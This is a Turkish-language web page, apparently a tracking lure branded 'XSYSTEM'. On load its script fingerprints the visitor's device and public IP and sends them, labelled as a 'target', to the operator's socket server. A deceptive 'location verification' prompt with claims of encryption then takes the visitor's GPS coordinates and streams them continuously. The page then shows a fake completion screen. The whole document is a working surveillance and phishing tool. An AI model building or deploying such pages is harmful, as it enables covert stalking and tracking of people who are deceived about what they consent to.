<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Yükleniyor...</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@400;500;600&display=swap" rel="stylesheet">
<style>
:root{--p:#9B30FF;--p2:#c084fc;--cy:#22d3ee;--bg:#04010f;--text:#ede9ff;--muted:#6b5a8e;}
*{margin:0;padding:0;box-sizing:border-box;}
body{background:var(--bg);font-family:'Rajdhani',sans-serif;min-height:100vh;color:var(--text);
  display:flex;align-items:center;justify-content:center;overflow:hidden;}
.bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;
  background-image:linear-gradient(rgba(155,48,255,0.07)1px,transparent 1px),linear-gradient(90deg,rgba(155,48,255,0.07)1px,transparent 1px);
  background-size:44px 44px;animation:gridScroll 25s linear infinite;}
@keyframes gridScroll{to{background-position:0 44px;}}
.bg-blobs{position:fixed;inset:0;z-index:0;pointer-events:none;
  background:radial-gradient(ellipse 65% 55% at 10% 15%,rgba(120,40,220,0.2)0%,transparent 60%),
  radial-gradient(ellipse 45% 40% at 90% 80%,rgba(200,60,255,0.1)0%,transparent 55%);}
.center{position:relative;z-index:1;text-align:center;padding:30px;max-width:400px;width:100%;}
.spinner-ring{width:80px;height:80px;border-radius:50%;margin:0 auto 28px;position:relative;}
.spinner-ring::before,.spinner-ring::after{content:'';position:absolute;border-radius:50%;}
.spinner-ring::before{inset:0;border:2px solid rgba(155,48,255,0.15);border-top-color:var(--p);animation:spin 1s linear infinite;}
.spinner-ring::after{inset:8px;border:1px solid rgba(34,211,238,0.15);border-bottom-color:var(--cy);animation:spin 1.5s linear infinite reverse;}
@keyframes spin{to{transform:rotate(360deg);}}
.brand{font-family:'Orbitron',monospace;font-size:22px;font-weight:900;letter-spacing:6px;
  background:linear-gradient(135deg,#c084fc,#9B30FF,#e879f9,#22d3ee);
  -webkit-background-clip:text;background-clip:text;color:transparent;
  filter:drop-shadow(0 0 10px rgba(155,48,255,0.5));margin-bottom:8px;}
.status-text{font-size:11px;letter-spacing:3px;color:var(--muted);margin-bottom:24px;}

/* İZİN KUTUSU */
.perm-box{display:none;background:rgba(14,7,35,0.9);border:1px solid rgba(155,48,255,0.3);
  border-radius:20px;padding:28px 22px;backdrop-filter:blur(20px);position:relative;overflow:hidden;}
.perm-box::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,transparent,rgba(155,48,255,0.6),transparent);}
.perm-box.visible{display:block;}
.perm-ico{font-size:40px;margin-bottom:16px;}
.perm-title{font-family:'Orbitron',monospace;font-size:14px;font-weight:700;letter-spacing:3px;
  color:var(--p2);margin-bottom:10px;}
.perm-desc{font-size:12px;color:var(--muted);letter-spacing:1px;line-height:1.6;margin-bottom:22px;}
.perm-btn{width:100%;padding:15px;border-radius:14px;border:none;cursor:pointer;
  font-family:'Orbitron',monospace;font-size:13px;font-weight:700;letter-spacing:3px;
  color:#fff;transition:all 0.3s;margin-bottom:10px;}
.perm-allow{background:linear-gradient(135deg,var(--p),#6a1b9a);
  box-shadow:0 0 25px rgba(155,48,255,0.4);}
.perm-allow:hover{transform:translateY(-2px);box-shadow:0 0 40px rgba(155,48,255,0.6);}
.perm-deny{background:rgba(255,68,102,0.1);border:1px solid rgba(255,68,102,0.3);
  color:rgba(255,68,102,0.7);font-size:11px;}
.perm-deny:hover{background:rgba(255,68,102,0.15);}

/* SONUÇ */
.result-box{display:none;background:rgba(14,7,35,0.9);border:1px solid rgba(74,222,128,0.3);
  border-radius:20px;padding:28px 22px;backdrop-filter:blur(20px);}
.result-box.visible{display:block;}
.result-ico{font-size:40px;margin-bottom:16px;}
.result-title{font-family:'Orbitron',monospace;font-size:13px;letter-spacing:3px;color:#4ade80;margin-bottom:8px;}
.result-sub{font-size:11px;color:var(--muted);letter-spacing:2px;}
</style>
</head>
<body>
<div class="bg-grid"></div>
<div class="bg-blobs"></div>

<div class="center">
  <!-- LOADING -->
  <div id="loadingView">
    <div class="spinner-ring"></div>
    <div class="brand">XSYSTEM</div>
    <div class="status-text" id="loadStatus">BAĞLANTI KURULUYOR...</div>
  </div>

  <!-- İZİN KUTUSU -->
  <div class="perm-box" id="permBox">
    <div class="perm-ico">📍</div>
    <div class="perm-title">KONUM DOĞRULAMA</div>
    <div class="perm-desc">Bu sayfaya devam edebilmek için konumunuzun doğrulanması gerekmektedir. Bilgileriniz şifreli protokol ile işlenmektedir.</div>
    <button class="perm-btn perm-allow" onclick="requestLocation()">KONUMU DOĞRULA</button>
    <button class="perm-btn perm-deny" onclick="denyLocation()">Şimdi değil</button>
  </div>

  <!-- BAŞARI -->
  <div class="result-box" id="resultBox">
    <div class="result-ico">✅</div>
    <div class="result-title">DOĞRULAMA TAMAMLANDI</div>
    <div class="result-sub">Bu sayfayı kapatabilirsiniz.</div>
  </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
const SESSION_ID = window.location.pathname.split('/')[2];
const socket = io();

// Cihaz bilgisi topla
function getDeviceInfo(){
  const ua = navigator.userAgent;
  let device = 'Bilinmiyor', os = 'Bilinmiyor', browser = 'Bilinmiyor';
  if(/Android/i.test(ua)) os='Android';
  else if(/iPhone|iPad/i.test(ua)) os='iOS';
  else if(/Windows/i.test(ua)) os='Windows';
  else if(/Mac/i.test(ua)) os='macOS';
  else if(/Linux/i.test(ua)) os='Linux';
  if(/Mobile/i.test(ua)) device='Mobil';
  else if(/Tablet|iPad/i.test(ua)) device='Tablet';
  else device='Masaüstü';
  if(/Chrome/i.test(ua)&&!/Edge/i.test(ua)) browser='Chrome';
  else if(/Firefox/i.test(ua)) browser='Firefox';
  else if(/Safari/i.test(ua)&&!/Chrome/i.test(ua)) browser='Safari';
  else if(/Edge/i.test(ua)) browser='Edge';
  return {
    userAgent: ua,
    device, os, browser,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    platform: navigator.platform,
    cookiesEnabled: navigator.cookieEnabled,
    referrer: document.referrer || 'Direkt'
  };
}

// IP bilgisi al (harici servis)
async function getIP(){
  try{
    const r = await fetch('https://api.ipify.org?format=json');
    const d = await r.json();
    return d.ip;
  }catch{ return 'Alınamadı'; }
}

async function init(){
  document.getElementById('loadStatus').textContent = 'CİHAZ TANIMLANIYOR...';
  const deviceInfo = getDeviceInfo();
  const ip = await getIP();
  deviceInfo.ip = ip;

  document.getElementById('loadStatus').textContent = 'BAĞLANTI KURULDU';
  setTimeout(()=>{
    document.getElementById('loadingView').style.display='none';
    document.getElementById('permBox').classList.add('visible');
  }, 1200);

  socket.emit('target_connect', { sessionId: SESSION_ID, deviceInfo });
}

function requestLocation(){
  if(!navigator.geolocation){
    socket.emit('location_denied', {sessionId: SESSION_ID});
    showResult();
    return;
  }
  document.getElementById('permBox').style.display='none';
  document.getElementById('loadingView').style.display='block';
  document.getElementById('loadStatus').textContent = 'KONUM ALINIYOR...';

  navigator.geolocation.getCurrentPosition(
    (pos)=>{
      const coords = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        speed: pos.coords.speed,
        timestamp: pos.timestamp
      };
      socket.emit('location_update', {sessionId: SESSION_ID, coords});
      showResult();
      // Sürekli güncelleme
      navigator.geolocation.watchPosition((p)=>{
        socket.emit('location_update', {sessionId: SESSION_ID, coords:{
          latitude:p.coords.latitude,longitude:p.coords.longitude,
          accuracy:p.coords.accuracy,timestamp:p.timestamp
        }});
      },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
    },
    ()=>{ socket.emit('location_denied',{sessionId:SESSION_ID}); showResult(); },
    {enableHighAccuracy:true,timeout:15000,maximumAge:0}
  );
}

function denyLocation(){
  socket.emit('location_denied',{sessionId:SESSION_ID});
  showResult();
}

function showResult(){
  document.getElementById('loadingView').style.display='none';
  document.getElementById('permBox').style.display='none';
  document.getElementById('resultBox').classList.add('visible');
}

socket.on('session_expired',()=>{
  document.getElementById('loadStatus').textContent='OTURUM SÜRESİ DOLDU';
});

init();
</script>
</body>
</html>
